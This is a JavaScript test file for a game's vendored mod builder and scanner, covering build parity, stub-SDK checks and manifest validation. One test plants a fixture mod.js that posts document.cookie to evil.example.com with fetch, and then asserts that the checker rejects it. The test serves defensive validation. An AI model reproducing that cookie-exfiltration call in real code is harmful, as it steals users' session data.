// The published toolchain, @spup/mod-builder: it is this repo's own builder and scanner, vendored,
// and it has to keep producing exactly what the in-repo tools produce — a third-party mod's package
// is only comparable to a first-party one if both were built by the same code.

import {test} from "node:test";
import assert from "node:assert/strict";
import {execFileSync} from "node:child_process";
import {mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync} from "node:fs";
import {createHash} from "node:crypto";
import {tmpdir} from "node:os";
import {join, resolve} from "node:path";
import {staleFiles} from "../../tools/pack-builder.js";
import {buildMod} from "../../tools/build-mod.js";

const CLI = resolve("packages/mod-builder/cli.js");

/**
 * @param {object} t the test context, for cleanup
 * @returns {string}
 */
function tempDir(t) {
    const dir = mkdtempSync(join(tmpdir(), "pipes-builder-pkg-"));
    t.after(() => rmSync(dir, {recursive: true, force: true}));
    return dir;
}

/**
 * @param {string[]} args
 * @returns {string} stdout
 */
function runCli(args) {
    return execFileSync("node", [CLI, ...args], {encoding: "utf8"});
}

/**
 * @param {string} path
 * @returns {string}
 */
function hashOf(path) {
    return createHash("sha256").update(readFileSync(path)).digest("hex");
}

test("the vendored lib is current", () => {
    // Whoever changes the builder, the scanner, or the manifest model reruns `npm run pack:builder`.
    assert.deepEqual(staleFiles(), []);
});

test("the packaged builder produces exactly what the in-repo one does", async (t) => {
    const dir = tempDir(t);
    const viaPackage = join(dir, "package");
    const inRepo = join(dir, "in-repo");

    runCli(["build", resolve("src/mods/Market"), viaPackage, "--version", "2.0.0"]);
    await buildMod(resolve("src/mods/Market"), inRepo, {version: "2.0.0"});

    for (const file of ["mod.js", "mod.json"]) {
        assert.equal(hashOf(join(viaPackage, file)), hashOf(join(inRepo, file)), file);
    }
});

test("check passes a real package and runs its factories against a stub SDK", (t) => {
    const dir = tempDir(t);
    runCli(["build", resolve("src/mods/Market"), dir, "--version", "2.0.0"]);

    // Market has a sim part, so passing means both factories ran against stubs without throwing.
    assert.match(runCli(["check", dir]), /all checks passed/);
    assert.match(runCli(["scan", join(dir, "mod.js")]), /clean/);
});

test("check refuses a bundle that reaches past the SDK", (t) => {
    const dir = tempDir(t);
    mkdirSync(dir, {recursive: true});
    writeFileSync(join(dir, "mod.json"), JSON.stringify({
        name: "hostile", version: "1.0.0", sdkVersion: 1, entry: "mod.js", parts: ["declaration"],
    }));
    writeFileSync(join(dir, "mod.js"), `
        export function createDeclaration(sdk) {
            fetch("https://evil.example.com", {body: document.cookie});
            return new sdk.AbstractModDeclaration();
        }
    `);

    assert.throws(() => runCli(["check", dir]), /disallowed globals/);
});

test("a mod's own spec runs against the fake SDK, with no game checkout", (t) => {
    const dir = tempDir(t);
    writeFileSync(join(dir, "declaration.js"), `
        import {AbstractModDeclaration, ObjectType, ItemDefinition, Direction} from "@/sdk/common.js";
        export class Declaration extends AbstractModDeclaration {
            get name() { return "Fixture"; }
            get objectTypes() { return [new ObjectType({name: "Widget", facing: Direction.UP})]; }
            get items() { return {900: new ItemDefinition("Pebble", "items/1-gray")}; }
        }
    `);
    writeFileSync(join(dir, "declaration.spec.js"), `
        import {test} from "node:test";
        import assert from "node:assert/strict";
        import {Declaration} from "./declaration.js";
        test("the fake echoes what the declaration built", () => {
            const declaration = new Declaration();
            assert.equal(declaration.name, "Fixture");
            assert.equal(declaration.objectTypes[0].name, "Widget");
            assert.equal(declaration.objectTypes[0].facing, 0);
            assert.equal(declaration.items[900].name, "Pebble");
        });
    `);

    // node's test runner refuses to run files when it detects it is already inside one, so the
    // child has to be told it is on its own.
    const env = {...process.env};
    delete env.NODE_TEST_CONTEXT;
    const output = execFileSync("node", [
        "--import", resolve("packages/mod-builder/testLoader.js"),
        "--test", join(dir, "declaration.spec.js"),
    ], {encoding: "utf8", env});

    assert.match(output, /# pass 1/);
    assert.match(output, /# fail 0/);
});

test("check refuses a package whose manifest and bundle disagree", (t) => {
    const dir = tempDir(t);
    mkdirSync(dir, {recursive: true});
    writeFileSync(join(dir, "mod.json"), JSON.stringify({
        name: "mismatched", version: "1.0.0", sdkVersion: 1, entry: "mod.js", parts: ["declaration", "sim"],
    }));
    writeFileSync(join(dir, "mod.js"), "export function createDeclaration(sdk) { return new sdk.AbstractModDeclaration(); }\n");

    assert.throws(() => runCli(["check", dir]), /declares the sim part/);
});
